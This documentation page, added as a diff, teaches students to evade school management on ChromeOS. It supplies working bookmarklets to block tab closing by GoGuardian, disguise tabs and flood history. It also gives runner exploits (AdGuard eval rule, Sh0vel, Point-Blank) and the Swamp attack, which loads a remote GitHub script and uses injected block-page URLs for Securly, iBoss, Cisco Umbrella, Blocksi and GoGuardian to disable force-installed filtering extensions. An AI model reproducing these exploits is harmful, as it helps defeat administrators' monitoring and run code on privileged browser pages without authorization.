@@ -1,0 +1,319 @@
+---
+title: "Create and Use Bookmarklets on Managed Chromebooks"
+sidebarTitle: "Bookmarklets"
+description: "Learn to create JavaScript bookmarklets, run them on managed Chromebooks using AdGuard or Sh0vel runners, and use Point-Blank for advanced script execution on newer versions."
+---
+
+A **bookmarklet** is a regular browser bookmark whose URL field contains JavaScript code instead of a web address. When you click it, the browser executes the script in the context of the current page — no extensions, no developer tools needed. On managed Chromebooks this makes bookmarklets one of the most portable ways to run exploit code, tweak page behavior, or bypass monitoring tools, since a bookmark sitting in your bookmark bar looks completely harmless to an observer or administrator.
+
+<Warning>
+  Native bookmarklet execution (clicking a `javascript:` bookmark and having it run) was **patched on ChromeOS v118 and newer**. On updated devices you will need a bookmarklet runner — AdGuard, Sh0vel, or Point-Blank — to execute JavaScript through a bookmark. See the **Bookmarklet Runners** section below for setup instructions.
+</Warning>
+
+## Creating a Basic Bookmarklet
+
+<Steps>
+  <Step title="Open the bookmark creation dialog">
+    Right-click on the bookmark bar (the strip below the address bar). If the bookmark bar isn't visible, press `Ctrl` + `Shift` + `B` to show it. Click **Add Page** (or **Add bookmark**) from the context menu.
+  </Step>
+  <Step title="Enter your JavaScript as the URL">
+    In the **URL** field, type or paste your JavaScript code. Every bookmarklet must begin with `javascript:` followed immediately by valid JS. For example:
+
+    ```javascript
+    javascript: alert('Hello from bookmarklet!');
+    ```
+  </Step>
+  <Step title="Name the bookmark">
+    Fill in the **Name** field at the top with anything you like — this is what appears on the bookmark bar.
+  </Step>
+  <Step title="Save and confirm the location">
+    Make sure the **Folder** or location is set to the **Bookmarks bar** so it stays accessible, then click **Save**. The bookmarklet will appear as a clickable item in your bar.
+  </Step>
+  <Step title="Run it">
+    Navigate to any page you want the script to affect, then click the bookmark. The JavaScript executes immediately in the context of that tab.
+  </Step>
+</Steps>
+
+## Useful Bookmarklet Examples
+
+### Anti Tab Close (GoGuardian)
+
+This exploit originates from around 2017–2018. It attaches a `beforeunload` handler to the tab, which prompts the user for confirmation before closing — preventing GoGuardian or similar tools from silently killing the tab. Run it on whatever tab you want to protect.
+
+```javascript
+javascript: onbeforeunload = (i) => 1;
+```
+
+An alternative minified form of the same exploit:
+
+```javascript
+javascript:onbeforeunload=i=>1
+```
+
+*Credits: Titanium Network, theskid22, Arsun*
+
+### Tab Disguiser
+
+Replaces the current tab's favicon and title with a Google Drive disguise so the tab looks innocuous to anyone glancing at your screen or taskbar. Note that this requires native bookmarklet execution (ChromeOS pre-v118) or a bookmarklet runner.
+
+**Option 1 — one-time disguise:**
+
+```javascript
+javascript: (function () {
+  var link =
+    document.querySelector("link[rel*='icon']") ||
+    document.createElement("link");
+  link.type = "image/x-icon";
+  link.rel = "shortcut icon";
+  link.href =
+    "https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico";
+  document.title = "My Drive - Google Drive";
+  console.log(document.title);
+  document.getElementsByTagName("head")[0].appendChild(link);
+})();
+```
+
+**Option 2 — updates the disguise every second** (more resistant to pages that reset their own title):
+
+```javascript
+javascript: function gcloak() {
+  var link =
+    document.querySelector("link[rel*='icon']") ||
+    document.createElement("link");
+  link.type = "image/x-icon";
+  link.rel = "shortcut icon";
+  link.href =
+    "https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico";
+  document.title = "My Drive - Google Drive";
+  console.log(document.title);
+  document.getElementsByTagName("head")[0].appendChild(link);
+}
+gcloak();
+setInterval(gcloak, 1000);
+```
+
+To customize: replace the `link.href` value with any image URL for a different favicon, and replace the `document.title` string with any title you want. The interval number (1000) is in milliseconds.
+
+*Credits: Titanium Network*
+
+### History Flooder
+
+Floods the browser history with repeated entries of the current page URL. This is patched in newer ChromeOS versions (the `javascript:` bookmark execution path is blocked). Run it on a page you want to bury in your history — but don't enter too large a number, as Chrome can crash.
+
+```javascript
+javascript:var num=prompt("How many times do you want this page to show up in your history?");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("Flooding successful!\n "+window.location.href+" \nis now in your history "+num+(num==1?" time.":" Times. "))}
+```
+
+<Note>
+  Browser history on a Chromebook is retained for approximately 3 months. Be mindful of what this script duplicates.
+</Note>
+
+*Made by BlazerHM*
+
+---
+
+## Bookmarklet Runners for Newer ChromeOS
+
+On ChromeOS v118+ the browser blocks `javascript:` URLs from executing when clicked from the bookmark bar. The runners below work around this restriction using extensions or privileged page exploits.
+
+### AdGuard Runner
+
+The AdGuard ad-blocker extension supports user scripts with `eval` access, which can be configured to execute bookmarklet code via a keyboard shortcut.
+
+<Steps>
+  <Step title="Install the AdGuard extension">
+    Install AdGuard Ad Blocker from the Chrome Web Store:
+    [https://chromewebstore.google.com/detail/adguard-adblocker/bgnkhhnnamicmpeenaelnjfhikgbkllg](https://chromewebstore.google.com/detail/adguard-adblocker/bgnkhhnnamicmpeenaelnjfhikgbkllg)
+  </Step>
+  <Step title="Enable User Scripts">
+    Navigate to:
+    ```text
+    chrome://extensions/?id=bgnkhhnnamicmpeenaelnjfhikgbkllg
+    ```
+    Toggle **Enable User Scripts** on.
+  </Step>
+  <Step title="Open Extension Options">
+    Click **Extension Options** on the same page.
+  </Step>
+  <Step title="Add the runner rule">
+    Go to the **User Rules** section and add the following rule:
+
+    ```text
+    *#%#window.addEventListener("keyup", event => { if (event.ctrlKey && event.which === 192) { let code = prompt("Eval:"); if (code && code.startsWith("javascript:")) { code = code.substring(11); } if (code) { eval(code); } } });
+    ```
+  </Step>
+  <Step title="Save">
+    Click **Save**. The runner is now active. On any page, press `Ctrl` + `` ` `` (backtick / the key above Tab) to open an eval prompt where you can paste and run any bookmarklet code.
+  </Step>
+</Steps>
+
+*Credits: schoolexploitkid, Titanium Network*
+
+### Sh0vel Runner
+
+Sh0vel is an advanced exploit that allows bookmarklets to run on privileged Chrome URLs (e.g., `chrome://extensions`) by leveraging an extension's `browserAction` API. It is most useful when combined with other exploits such as Skiovox Breakout or RigTools that already give you code execution inside an extension.
+
+<Steps>
+  <Step title="Obtain code execution inside an extension">
+    Sh0vel requires an existing foothold — code execution within a Chrome extension. This can come from Point-Blank, Skiovox Breakout, RigTools, an XSS vulnerability, DNS spoofing, or another exploit. Without this, Sh0vel cannot proceed.
+  </Step>
+  <Step title="Verify the extension has required permissions">
+    The extension you are operating within must have all of the following:
+
+    - `tabs`
+    - `activeTab`
+    - `browserAction`
+    - `'unsafe-eval'` listed in its Content Security Policy
+
+    If any of these are missing, Sh0vel will not work in that extension.
+  </Step>
+  <Step title="Enable the chrome-urls flag">
+    In a browser tab, go to `chrome://flags` and enable:
+
+    ```text
+    #extensions-on-chrome-urls
+    ```
+  </Step>
+  <Step title="Prepare your bookmarklet">
+    Choose the bookmarklet you want to run. Wrap it in the following extension code, replacing the `javascript:` portion with your own bookmarklet:
+
+    ```javascript
+    chrome.browserAction.onClicked.addListener(() => {
+      chrome.tabs.executeScript(null, {
+        code: `location.href="javascript:replace this part with your own bookmarklet.";`
+      });
+    });
+    ```
+
+    For example, to run the **blank3r** bookmarklet (which toggles extension file access):
+
+    ```javascript
+    chrome.browserAction.onClicked.addListener(() => {
+      chrome.tabs.executeScript(null, {
+        code: `let link=window.open('about:blank','_blank');link.location.href="javascript:let shim = false;var ids = prompt('extension ids (comma separated)').split(',');setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);";`
+      });
+    });
+    ```
+  </Step>
+  <Step title="Open the target URL">
+    Navigate to the privileged URL where you want the bookmarklet to run. For blank3r, open `chrome://extensions`. To open a System Web App (SWA) such as `chrome://os-settings` as a normal tab, use:
+
+    ```javascript
+    chrome.tabs.create({}, () => {
+      chrome.tabs.update(null, { url: "chrome://file-manager" });
+    });
+    ```
+
+    Replace `chrome://file-manager` with any SWA URL you need.
+  </Step>
+  <Step title="Click the extension icon">
+    Click the extension's toolbar icon. If everything is configured correctly, your bookmarklet will execute on the privileged page.
+  </Step>
+</Steps>
+
+*Credits: Writable (SWA tab opening), Hannah (original API access exploit), Whelement, Titanium Network*
+
+### Point-Blank
+
+Point-Blank exploits `chrome://settings` to execute a bookmarklet on a privileged Chrome page. Bookmarklets must **not** be blocked by policy for this to work.
+
+<Steps>
+  <Step title="Navigate to the settings reset page">
+    Go to:
+    ```text
+    chrome://settings/resetProfileSettings
+    ```
+  </Step>
+  <Step title="Open current settings">
+    Click **current settings** on the page.
+  </Step>
+  <Step title="Run a bookmarklet on the settings tab">
+    Click your saved bookmarklet (e.g., `javascript:opener.alert()`). You are now executing code in the context of the `chrome://settings` tab.
+  </Step>
+</Steps>
+
+Full write-up and technical details: [https://blog.bypassi.com/_/point-blank/](https://blog.bypassi.com/_/point-blank/)
+
+### Point-Blank New (Swamp)
+
+Swamp is the successor to Point-Blank, created by 3kh0 with the original idea from Bypassi. It works like LTBEEF — a GUI-based exploit for disabling extensions — but remains unpatched on ChromeOS versions post-v102 through v107. Bookmarklets must **not** be blocked by policy.
+
+Swamp lets you:
+- Disable force-installed extensions (similar to LTBEEF) on Chrome 107 where LTBEEF is patched
+- Run bookmarklets on any page even when normally blocked
+- Break extensions until a powerwash or manual re-enable
+- Run a custom DNS to block network requests
+- Execute custom code with access to most of the Chrome API
+
+<Steps>
+  <Step title="Bookmark the Swamp script">
+    Save the script at the following URL as a bookmarklet:
+
+    ```text
+    https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js
+    ```
+  </Step>
+  <Step title="Navigate to your extension's block page">
+    Open the block page URL that matches your school's filtering extension. Use the link for whichever extension is installed:
+
+    <Accordion title="Securly">
+      ```text
+      chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=PGEgaHJlZj0iYWJvdXQ6YmxhbmsiIHRhcmdldD0iX2JsYW5rIiByZWw9Im9wZW5lciIgc3R5bGU9IiBiYWNrZ3JvdW5kOiB3aGl0ZTsgY29sb3I6IGJsYWNrOyBkaXNwbGF5OiBibG9jazsgaGVpZ2h0OiAzODBweDsgdHJhbnNmb3JtOiBzY2FsZSgyLjUpOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgIj48ZGl2PkNsaWNrIE1lPC9kaXY+IDwvYT4=
+      ```
+      If the page says "blocked by Chrome", reload it. Note: Securly has patched this for newer extension versions. If it doesn't work, try the alternate Securly link:
+      ```text
+      chrome-extension://joflmkccibkooplaeoinecjbmdebglab/blocked.html?category=PGEgaHJlZj0iYWJvdXQ6YmxhbmsiIHRhcmdldD0iX2JsYW5rIiByZWw9Im9wZW5lciIgc3R5bGU9IiBiYWNrZ3JvdW5kOiB3aGl0ZTsgY29sb3I6IGJsYWNrOyBkaXNwbGF5OiBibG9jazsgaGVpZ2h0OiAzODBweDsgdHJhbnNmb3JtOiBzY2FsZSgyLjUpOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgIj48ZGl2PkNsaWNrIE1lPC9kaXY+IDwvYT4=
+      ```
+    </Accordion>
+
+    <Accordion title="iBoss">
+      ```text
+      chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html?re=1&bc=%3Ca+href=%22about:blank%22%20rel=%22opener%22%20target=%22_blank%22%3Ehi%3C/a%3E
+      ```
+    </Accordion>
+
+    <Accordion title="Cisco Umbrella">
+      ```text
+      chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/debug.html?error=%3Ca%20href%3D%22about:blank%22%20rel%3D%22opener%22%20target%3D%22_blank%22%3Ehey%3C/a%3E
+      ```
+    </Accordion>
+
+    <Accordion title="Blocksi">
+      ```text
+      chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html?blockurl={%22hostname%22:%22%3Ca%20href=%27//%27%20rel=%27opener%27%20target=%27_blank%27%3Etest%3C/a%3E%22}
+      ```
+    </Accordion>
+
+    <Accordion title="GoGuardian">
+      ```text
+      chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/teacher/lesson-plans/blocked.html?cs=[1,{%22name%22:%22%3Ca%20href=%27about:blank%27%20rel=%27opener%27%20target=%27_blank%27%3ECLICK%20ME%3C/a%3E%22}]
+      ```
+      Note: this may not work if your school has updated GoGuardian to a newer version.
+    </Accordion>
+  </Step>
+  <Step title="Click the blue link on the block page">
+    Each block page URL is designed to render a visible clickable link. Find the blue link on the page and click it — this opens a blank tab with the `opener` reference still intact.
+  </Step>
+  <Step title="Run the Swamp bookmarklet">
+    If the blank tab opens, click the Swamp bookmarklet you saved in Step 1.
+  </Step>
+  <Step title="Disable or manage extensions">
+    The Swamp GUI will appear. Click **Soft Disable** to disable extensions only until the next Chromebook restart, or **Hard Disable** for a more persistent effect. You can also run custom scripts from this interface.
+  </Step>
+</Steps>
+
+<Note>
+  It is recommended to use **Soft Disable** — it only disables extensions until you restart your Chromebook, which is easier to reverse. Some extensions may block JavaScript injection, in which case running custom code through Swamp may not work even if extension disabling succeeds.
+</Note>
+
+*Credits: 3kh0, Bypassi, Titanium Network — source at [https://github.com/3kh0/ext-remover](https://github.com/3kh0/ext-remover)*
+
+---
+
+<Tip>
+  You can also run arbitrary JavaScript without any bookmarklet at all by using uBlock Origin's built-in script injection. See [JavaScript Runners](/exploits/javascript-runners) for details on that approach.
+</Tip>
+
+<Note>
+  Some bookmarklet runners — particularly the AdGuard runner — require a specific version of the extension and may stop working if the extension is updated by policy. Always verify the runner is still functional after any extension update on your device.
+</Note>
